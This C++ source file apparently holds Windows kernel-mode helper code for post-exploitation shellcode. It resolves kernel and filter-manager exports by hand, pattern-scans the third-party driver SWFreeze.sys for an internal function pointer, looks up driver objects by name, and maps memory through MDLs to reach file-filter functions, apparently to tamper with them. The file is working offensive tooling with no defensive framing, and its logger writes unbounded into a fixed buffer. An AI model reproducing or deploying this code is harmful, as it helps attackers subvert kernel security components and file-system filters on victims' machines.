#include "r0utils.hpp"

CHAR logBuf[4096] = { 0 };
CHAR* logBufPtr = logBuf;

DbgPrint_T DbgPrint = NULL;
IoGetDeviceObjectPointer_T IoGetDeviceObjectPointer = NULL;
MmIsAddressValid_T MmIsAddressValid = NULL;
DbgBreakPoint_T DbgBreakPoint = NULL;
ZwQuerySystemInformation_T ZwQuerySystemInformation = NULL;
ExAllocatePool_T ExAllocatePool = NULL;
ExFreePool_T ExFreePool = NULL;
ObReferenceObjectByName_T ObReferenceObjectByName = NULL;
FltGetFileNameInformation_T FltGetFileNameInformation = NULL;
FltParseFileNameInformation_T FltParseFileNameInformation = NULL;
FltReleaseFileNameInformation_T FltReleaseFileNameInformation = NULL;
RtlCompareUnicodeString_T RtlCompareUnicodeString = NULL;
RtlCopyUnicodeString_T RtlCopyUnicodeString = NULL;
IoAllocateMdl_T IoAllocateMdl = NULL;
MmProbeAndLockPages_T MmProbeAndLockPages = NULL;
MmGetSystemAddressForMdlSafe_T MmGetSystemAddressForMdlSafe = NULL;
MmUnlockPages_T MmUnlockPages = NULL;
MmUnmapLockedPages_T MmUnmapLockedPages = NULL;
MmMapLockedPagesSpecifyCache_T MmMapLockedPagesSpecifyCache = NULL;
IoFreeMdl_T IoFreeMdl = NULL;
PVOID* IoDriverObjectType = NULL;

VOID Logger(LPCSTR fmt, ...) {
	va_list args;
	va_start(args, fmt);
	vsprintf(logBufPtr, fmt, args);
	DbgPrint("%s", logBufPtr);
	logBufPtr = logBuf + strlen(logBuf);
	va_end(args);
}

BOOLEAN InitObReferenceObjectByName() {
	PVOID DriverBase = NULL;
	SIZE_T DriverSize = 0;
	GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize);
	DWORD64 Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x48\x8B\x08\x48\x89", 5);
	ObReferenceObjectByName = Address ? *(ObReferenceObjectByName_T*)(Address + *(INT32*)((BYTE*)Address + 0xE) + 0x12) : 0;
	if (!ObReferenceObjectByName) return FALSE;
	return TRUE;
}

PDRIVER_OBJECT GetDriverObjectByName(WCHAR* DriverName) {
	UNICODE_STRING uDriverName;
	NTSTATUS status;
	PDRIVER_OBJECT pDriverObject;
	RtlInitUnicodeString(&uDriverName, DriverName);

	if (!ObReferenceObjectByName) {
		if (!InitObReferenceObjectByName()) {
			return NULL;
		}
	}
	status = ObReferenceObjectByName(&uDriverName, 0, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)(&pDriverObject));
	if (NT_SUCCESS(status)) {
		return pDriverObject;
	}
	else {
		return NULL;
	}
}

DWORD64 ScanPatternByMask(PVOID base, SIZE_T limit, BYTE* pattern, SIZE_T patternSize, BYTE* mask) {
	DWORD64 TargetAddress = 0;
	for (SIZE_T i = 0; i < limit - patternSize; i++) {
		BOOLEAN found = TRUE;
		for (SIZE_T j = 0; j < patternSize; j++) {
			if (mask[j] == 'x' && *(BYTE*)((BYTE*)base + i + j) != pattern[j]) {
				found = FALSE;
				break;
			}
		}
		if (found) {
			TargetAddress = (DWORD64)base + i;
			break;
		}
	}
	return TargetAddress;
}

DWORD64 ScanPattern(PVOID base, SIZE_T limit, BYTE* pattern, SIZE_T patternSize) {
	BYTE* mask = (BYTE*)ExAllocatePool(1, patternSize);
	RtlFillMemory(mask, patternSize, 'x');
	DWORD64 address = ScanPatternByMask(base, limit, pattern, patternSize, mask);
	ExFreePool(mask);
	return address;
}

PVOID GetFunctionByExportDir(PVOID imageBase, const char* FunctionName)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

	IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (exportDataDir.Size == 0) return NULL;

	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + exportDataDir.VirtualAddress);

	PDWORD nameTable = (PDWORD)((PBYTE)imageBase + exportDir->AddressOfNames);
	PWORD ordinalTable = (PWORD)((PBYTE)imageBase + exportDir->AddressOfNameOrdinals);
	PDWORD addressTable = (PDWORD)((PBYTE)imageBase + exportDir->AddressOfFunctions);

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
	{
		char* currentName = (char*)((PBYTE)imageBase + nameTable[i]);

		if (strcmp(currentName, FunctionName) == 0)
		{
			WORD ordinal = ordinalTable[i];
			ULONG functionRva = addressTable[ordinal];
			return (PVOID)((PBYTE)imageBase + functionRva);
		}
	}
	return NULL;
}

BOOLEAN GetDriverBaseAndSize(const char* targetModuleName, PVOID* pDriverBase, SIZE_T* pDriverSize) {
	NTSTATUS status;
	ULONG bufferSize = 0;
	PVOID buffer = NULL;
	PVOID baseAddress = NULL;
	const ULONG SystemModuleInformation = 11;

	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &bufferSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH || bufferSize > 0) {
		if (buffer) ExFreePool(buffer);

		buffer = ExAllocatePool(1, bufferSize);
		if (!buffer) return FALSE;

		status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &bufferSize);
		if (NT_SUCCESS(status)) break;
	}

	if (NT_SUCCESS(status)) {
		PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)buffer;

		for (ULONG i = 0; i < modules->NumberOfModules; i++) {
			char* fileName = (char*)(modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName);

			if (_stricmp(fileName, targetModuleName) == 0) {
				*pDriverBase = modules->Modules[i].ImageBase;
				*pDriverSize = modules->Modules[i].ImageSize;
				break;
			}
		}
	}

	if (buffer) ExFreePool(buffer);
	return TRUE;
}

PVOID InitRWmemForShellcode(PVOID base, SIZE_T size, PMDL* ppMdl) {
	PMDL pMdl = IoAllocateMdl(base, size, FALSE, FALSE, NULL);
	if (pMdl == NULL)
	{
		Logger("[-] Failed to allocate MDL for file filter function\n");
		return NULL;
	}
	*ppMdl = pMdl;

	__try
	{
		MmProbeAndLockPages(pMdl, KernelMode, IoReadAccess);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Logger("[-] Failed to lock pages for file filter function\n");
		ReleaseRwmem(pMdl, NULL);
		return NULL;
	}

	PVOID addr = MmMapLockedPagesSpecifyCache(pMdl, KernelMode, 0, NULL, FALSE, NormalPagePriority | MdlMappingNoExecute);
	if (addr == NULL) {
		ReleaseRwmem(pMdl, NULL);
		return NULL;
	}

	return addr;
}

VOID ReleaseRwmem(PMDL pMdl, PVOID addr) {
	if (addr != NULL) MmUnmapLockedPages(addr, pMdl);
	if (pMdl != NULL)
	{
		MmUnlockPages(pMdl);
		IoFreeMdl(pMdl);
	}
}

VOID InitFunction(PVOID krnl_base, get_system_routine_t get_kroutine) {
	InitFunctionByName(DbgPrint);
	InitFunctionByName(IoGetDeviceObjectPointer);
	InitFunctionByName(MmIsAddressValid);
	InitFunctionByName(DbgBreakPoint);
	InitFunctionByName(ZwQuerySystemInformation);
	InitFunctionByName(ExAllocatePool);
	InitFunctionByName(ExFreePool);
}

VOID InitFunctionForFileFilter(PVOID krnl_base, get_system_routine_t get_kroutine) {
	PVOID fltMgrBase;
	SIZE_T fltMgrSize;
	GetDriverBaseAndSize("fltMgr.sys", &fltMgrBase, &fltMgrSize);
	if (!fltMgrBase) {
		return;
	}
	FltGetFileNameInformation = (FltGetFileNameInformation_T)GetFunctionByExportDir(fltMgrBase, "FltGetFileNameInformation");
	FltParseFileNameInformation = (FltParseFileNameInformation_T)GetFunctionByExportDir(fltMgrBase, "FltParseFileNameInformation");
	FltReleaseFileNameInformation = (FltReleaseFileNameInformation_T)GetFunctionByExportDir(fltMgrBase, "FltReleaseFileNameInformation");
	InitFunctionByName(IoAllocateMdl);
	InitFunctionByName(MmProbeAndLockPages);
	InitFunctionByName(MmMapLockedPagesSpecifyCache);
	InitFunctionByName(MmUnlockPages);
	InitFunctionByName(MmUnmapLockedPages);
	InitFunctionByName(IoFreeMdl);
	InitFunctionByName(RtlCompareUnicodeString);
	InitFunctionByName(RtlCopyUnicodeString);
}